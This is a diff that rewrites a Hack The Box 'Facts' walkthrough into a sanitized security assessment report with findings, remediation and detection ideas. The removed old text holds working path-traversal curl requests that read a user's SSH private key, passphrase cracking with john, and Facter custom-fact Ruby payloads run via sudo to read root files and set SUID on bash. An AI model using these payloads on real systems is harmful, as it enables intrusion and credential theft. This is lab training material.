@@ -1,174 +1,101 @@
-<div align="center">
+# Facts — Security Assessment
 
-# 📊 HTB: Facts
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Linux |
+| Difficulty | Easy |
+| Assessment date | 2026-01-31 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `linux` `rails` `lfi` `ssh-key-cracking` `facter-privesc`
+The notes report elevated application registration, authenticated file disclosure, SSH access as trivia, and elevated Facter execution.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — Open admin registration on a Rails app leads to an authenticated LFI that leaks an SSH private key. Crack its passphrase with John, log in, and a sudo-enabled `facter` binary (Puppet's system-info tool) lets you run arbitrary Ruby as root via a custom fact.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Linux |
-| 🎯 **Target** | `<TARGET_IP>` (facts.htb) |
-| 🎚️ **Difficulty** | Easy |
-| 📅 **Date** | January 31, 2026 |
-| 🏁 **Outcome** | ✅ Full compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/facts/{scans,screenshots}
+nmap -sV -p 22,80,54321 -oA evidence/facts/scans/services "$TARGET_IP"
 ```
 
-| Port | Service |
-|:---:|---|
-| `22` | OpenSSH 9.9p1 (Ubuntu) |
-| `80` | nginx 1.26.3 → facts.htb |
-| `54321` | MinIO (S3-compatible object storage) |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
+
+## 4. Reconnaissance and service analysis
+
+22 OpenSSH 9.9p1; 80 nginx 1.26.3/Rails; 54321 MinIO. MinIO exposure is a lead, not a validated weakness.
+
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
+
+## 5. Recorded initial-access path
+
+A newly registered account reportedly accessed administration features. A media download function disclosed files beyond the intended content boundary, including sensitive authentication material. SSH access as trivia is reported.
+
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
+
+## 6. Privilege escalation and impact validation
+
+The recorded sudo policy permitted Facter to load custom Ruby code from a caller-selected directory as root. The notes record privileged file access and describe an additional shell method; do not treat the additional suggested method as independently evidenced.
+
+In an already authorized session, record identity without reading objective contents:
 
 ```bash
-echo "<TARGET_IP> facts.htb" | sudo tee -a /etc/hosts
-```
-
-The web app is Ruby on Rails (`_factsapp_session` cookie, `x-runtime` timing header). MinIO on 54321 is worth a look too, but the Rails app turns out to be the faster path in.
-
----
-
-## 🚩 Shell as `trivia`
-
-### Registration → admin, no gate in the way
-
-The app allows open self-registration, and — critically — nothing stops a freshly registered account from landing with admin privileges. Once inside `/admin`, an LFI shows up in the media handler:
-
-```
-/admin/media/download_private_file?file=<path>
-```
-
-> ⚠️ **Root cause:** the `file` parameter goes straight into a file read with traversal sequences (`../../../../../../`) unfiltered — classic LFI (CWE-22), but gated behind auth that turned out to be trivially obtainable.
-
-### Reading the user flag
-
-```bash
-curl -b "_factsapp_session=<cookie>" \
-  "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/williams/user.txt"
-```
-
-(Note: the username is **`williams`** with an "s" — an earlier guess of `william` returned nothing.)
-
-```
-<USER_FLAG_REDACTED>
-```
-
-### Escalating the LFI into an SSH key
-
-If it can read one file under `/home`, it can read `.ssh/` too:
-
-```bash
-curl -b "_factsapp_session=<cookie>" \
-  "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519" \
-  > id_ed25519
-chmod 600 id_ed25519
-```
-
-The key is encrypted with a passphrase. `ssh2john` + `john` makes short work of it:
-
-```bash
-ssh2john id_ed25519 > id_ed25519.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
-```
-
-Cracked in under 3 minutes: **`dragonballz`**
-
-```bash
-ssh -i id_ed25519 trivia@<TARGET_IP>
-# passphrase: dragonballz
-```
-
-Shell as `trivia`.
-
----
-
-## 👑 Root — Facter Custom-Fact Abuse
-
-```bash
+id
+hostname
 sudo -l
 ```
 
-```
-(root) NOPASSWD: /usr/bin/facter --custom-dir
-```
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-`facter` is Puppet's system-facts tool — and it supports **custom facts** written in Ruby, loaded from a directory you specify with `--custom-dir`. Since `trivia` can run it as root with an arbitrary custom-fact directory, that's arbitrary Ruby execution as root.
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-> 💡 Any tool that lets you point it at "run this code from this directory" under sudo is a privilege-escalation primitive, regardless of what the tool's actual job is.
+## 7. Evidence register and limitations
 
-```bash
-cat > /tmp/exploit.rb << 'EOF'
-Facter.add('root_flag') do
-  setcode do
-    File.read('/root/root.txt')
-  end
-end
-EOF
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-sudo /usr/bin/facter --custom-dir /tmp root_flag
-```
+SSH access and privileged file access reported; original outputs and policy evidence required.
 
-```
-<ROOT_FLAG_REDACTED>
-```
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/facts.md), reviewed at blob SHA `6e483b16c088e62b30c0a2916145b19ea40d9ad0`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-For a full interactive root shell instead of just a flag read:
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-cat > /tmp/shell.rb << 'EOF'
-Facter.add('pwn') do
-  setcode do
-    system('chmod +s /bin/bash')
-  end
-end
-EOF
+## 8. Findings and remediation
 
-sudo /usr/bin/facter --custom-dir /tmp pwn
-/bin/bash -p
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Elevated self-registration | Assign least-privilege roles server-side and require approval for administrative access. |
+| F-002 | Arbitrary file disclosure | Resolve permitted files through server-managed identifiers; enforce authorization and canonical path boundaries. |
+| F-003 | Exposed SSH authentication material | Rotate affected keys and passphrases; prevent web-process access to user key directories. |
+| F-004 | Privileged custom-code loading | Remove broad sudo access; use administrator-owned immutable custom facts if needed. |
 
----
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
-## 📦 Evidence Index
+## 9. Detection opportunities
 
-| Step | Command |
-|---|---|
-| Full port scan | `nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000` |
-| LFI — user flag | `curl .../download_private_file?file=../../../../../../home/williams/user.txt` |
-| LFI — SSH key exfil | `curl .../download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519` |
-| Passphrase crack | `ssh2john id_ed25519 \| john --wordlist=rockyou.txt` |
-| Privesc | `sudo /usr/bin/facter --custom-dir /tmp root_flag` |
+Unexpected administrative role assignment; abnormal media-download paths; web-account reads of SSH material; Facter execution with user-writable content. Tune for approved configuration management.
 
-## 🛠️ Remediation
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-| Finding | Fix |
-|---|---|
-| Open registration granting admin | Gate admin role assignment behind explicit invite/approval — never default a self-registered account to elevated privileges. |
-| Authenticated LFI in media download endpoint | Whitelist file paths server-side; never build filesystem paths directly from user input. |
-| SSH private key readable via app-layer LFI | Don't store SSH keys anywhere the web app process can read; restrict `~/.ssh` permissions to the owning user only. |
-| Weak SSH key passphrase | Enforce stronger passphrase policy, or better, avoid passphrase-only protection for keys that grant a foothold. |
-| `sudo facter --custom-dir` | Remove this sudo grant, or restrict to a read-only, root-owned custom-fact directory the invoking user cannot write to. |
+## 10. Remediation validation
 
----
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-<div align="center">
+## 11. Lessons learned and remaining work
 
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-</div>
+[Back to walkthrough inventory](./README.md)
